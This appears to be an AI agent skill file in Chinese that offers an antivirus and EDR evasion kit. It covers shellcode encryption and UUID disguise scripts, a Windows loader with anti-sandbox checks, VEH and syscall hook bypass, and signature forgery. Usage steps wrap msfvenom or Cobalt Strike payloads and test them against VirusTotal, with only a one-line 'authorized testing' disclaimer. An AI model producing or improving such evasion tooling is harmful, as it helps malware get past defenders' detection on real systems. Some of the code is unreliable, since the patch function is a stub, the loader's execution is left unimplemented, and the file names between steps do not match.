---
name: ai-av-evasion
description: 使用AI生成免杀Loader和处理Shellcode，结合多种免杀技术绕过主流杀软检测
---

# AI免杀技术套件

## 功能描述

本Skill提供完整的免杀解决方案，包括Shellcode处理和Loader编写，利用AI生成高免杀效果的恶意代码载体，绕过主流杀软和EDR检测。

## 使用场景

当需要：
- 生成免杀的恶意代码载体
- 处理Shellcode以逃避检测
- 编写具有反检测能力的Loader
- 进行授权的安全测试和渗透评估

## 核心技术

### 1. Shellcode处理流程

#### 步骤1: Shellcode Patch
- **同义指令替换**：识别并替换汇编指令，如`mov rax,0` → `xor rax,rax`
- **花指令注入**：添加无意义的指令和跳转，破坏特征码
- **指令重排**：调整指令顺序，保持功能不变但改变特征

#### 步骤2: Shellcode加密
- **自定义加密算法**：使用魔改的SM4算法，自定义S盒
- **多层加密**：结合AES、RC4等多种算法进行多层加密
- **动态密钥**：运行时生成密钥，增加解密难度

#### 步骤3: Shellcode混淆
- **编码伪装**：将Shellcode伪装成UUID、IPv4/IPv6地址、MAC地址等
- **分块存储**：将Shellcode分割成多个小块，分散存储
- **动态拼接**：运行时动态拼接和解码Shellcode

### 2. Loader编写

#### 步骤1: 核心功能实现
- **VEH内存保护**：通过异常处理机制规避内存扫描
- **Syscall绕过**：使用地狱之门、天堂之门等技术绕过用户层Hook
- **反沙箱检测**：检测虚拟机、沙箱环境，避免在分析环境中执行
- **隐蔽运行**：无窗口执行、后台运行、进程注入等

#### 步骤2: 代码混淆
- **变量名混淆**：使用随机字符串替换敏感变量名
- **控制流混淆**：添加无意义的分支和循环，增加分析难度
- **字符串加密**：对敏感字符串进行加密，运行时动态解密

#### 步骤3: 编译优化
- **编译器选项**：使用-Os优化，减少代码体积
- **资源添加**：添加合法资源文件，伪装成正常程序
- **签名伪造**：模拟合法程序的数字签名特征

## 技术实现

### Shellcode处理脚本

#### shellcode-patch.py
```python
#!/usr/bin/env python3
"""
Shellcode Patch工具
功能：对Shellcode进行同义指令替换、花指令注入和指令重排
"""

import sys

def patch_shellcode(shellcode):
    # 实现Shellcode Patch逻辑
    # 1. 同义指令替换
    # 2. 花指令注入
    # 3. 指令重排
    patched_shellcode = shellcode  # 实际实现需要根据具体架构进行处理
    return patched_shellcode

def main():
    if len(sys.argv) != 2:
        print("Usage: python shellcode-patch.py <shellcode_file>")
        return
    
    with open(sys.argv[1], 'r') as f:
        shellcode = f.read()
    
    patched = patch_shellcode(shellcode)
    
    with open('shellcode_patched.c', 'w') as f:
        f.write(patched)
    
    print("Shellcode patched successfully!")

if __name__ == "__main__":
    main()
```

#### shellcode-encrypt.py
```python
#!/usr/bin/env python3
"""
Shellcode加密工具
功能：使用自定义加密算法对Shellcode进行加密
"""

import sys

def custom_encrypt(shellcode, key):
    # 实现自定义加密算法
    encrypted = bytearray()
    for i, byte in enumerate(shellcode):
        encrypted_byte = (byte ^ key[i % len(key)])
        encrypted.append(encrypted_byte)
    return encrypted

def main():
    if len(sys.argv) != 3:
        print("Usage: python shellcode-encrypt.py <shellcode_file> <key>")
        return
    
    with open(sys.argv[1], 'rb') as f:
        shellcode = f.read()
    
    key = sys.argv[2].encode()
    encrypted = custom_encrypt(shellcode, key)
    
    # 生成C语言数组格式
    c_array = "unsigned char shellcode[] = {" + ",".join([f"0x{byte:02x}" for byte in encrypted]) + "};"
    
    with open('shellcode_encrypted.c', 'w') as f:
        f.write(c_array)
    
    print("Shellcode encrypted successfully!")

if __name__ == "__main__":
    main()
```

#### shellcode-obfuscate.py
```python
#!/usr/bin/env python3
"""
Shellcode混淆工具
功能：将Shellcode伪装成UUID、IPv4/IPv6地址等格式
"""

import sys
import uuid

def obfuscate_as_uuid(shellcode):
    # 将Shellcode伪装成UUID数组
    uuids = []
    for i in range(0, len(shellcode), 16):
        chunk = shellcode[i:i+16]
        if len(chunk) < 16:
            chunk = chunk.ljust(16, b'\x00')
        uuid_str = str(uuid.UUID(bytes=chunk))
        uuids.append(uuid_str)
    return uuids

def main():
    if len(sys.argv) != 2:
        print("Usage: python shellcode-obfuscate.py <shellcode_file>")
        return
    
    with open(sys.argv[1], 'rb') as f:
        shellcode = f.read()
    
    uuids = obfuscate_as_uuid(shellcode)
    
    # 生成C语言数组格式
    c_array = "char* uuid_array[] = {" + ",".join([f'"{uuid}"' for uuid in uuids]) + "};"
    
    with open('shellcode_obfuscated.c', 'w') as f:
        f.write(c_array)
    
    print("Shellcode obfuscated successfully!")

if __name__ == "__main__":
    main()
```

### Loader模板

#### loader.c
```c
#include <windows.h>
#include <stdio.h>

// 反沙箱检测
BOOL check_sandbox() {
    // 检测特定文件是否存在
    if (GetFileAttributesA("C:\\Users\\Public\\1234567.txt") == INVALID_FILE_ATTRIBUTES) {
        return TRUE; // 沙箱环境
    }
    return FALSE;
}

// VEH异常处理
LONG WINAPI VEHHandler(PEXCEPTION_POINTERS ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        // 处理内存访问异常，临时设置权限
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

// Syscall封装
typedef NTSTATUS(WINAPI* NtAllocateVirtualMemory_t)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(WINAPI* NtWriteVirtualMemory_t)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(WINAPI* NtCreateThreadEx_t)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// 主函数
int main() {
    // 反沙箱检测
    if (check_sandbox()) {
        return 0;
    }
    
    // 注册VEH
    AddVectoredExceptionHandler(1, VEHHandler);
    
    // 解密和反混淆Shellcode
    // 这里需要根据实际的加密和混淆方法实现
    
    // 内存操作和执行Shellcode
    // 使用Syscall绕过Hook
    
    return 0;
}
```

## 使用指南

### 1. 准备工作
1. 生成原始Shellcode（如使用msfvenom或Cobalt Strike）
2. 将Shellcode保存为shellcode_raw.bin文件

### 2. 处理Shellcode
1. **Patch Shellcode**：`python shellcode-patch.py shellcode_raw.bin`
2. **加密Shellcode**：`python shellcode-encrypt.py shellcode_patched.bin mysecretkey`
3. **混淆Shellcode**：`python shellcode-obfuscate.py shellcode_encrypted.bin`

### 3. 编写Loader
1. 根据生成的shellcode_obfuscated.c，修改loader.c中的解密和反混淆逻辑
2. 编译Loader：`gcc -o loader.exe loader.c -mwindows`

### 4. 测试免杀效果
1. 使用VT等在线检测工具测试
2. 在安装了主流杀软的环境中测试
3. 根据检测结果调整免杀策略

## 注意事项

1. **合法性**：本工具仅用于授权的安全测试和渗透评估
2. **安全性**：使用后请及时清理测试环境，避免造成安全隐患
3. **时效性**：免杀技术会随着杀软的更新而失效，需要定期更新免杀策略
4. **创新性**：结合最新的免杀技术，不断优化和改进免杀方案

## 参考资料

- 免杀技术原理与实践
- AI在网络安全中的应用
- 现代EDR检测机制分析
- 系统底层安全编程技术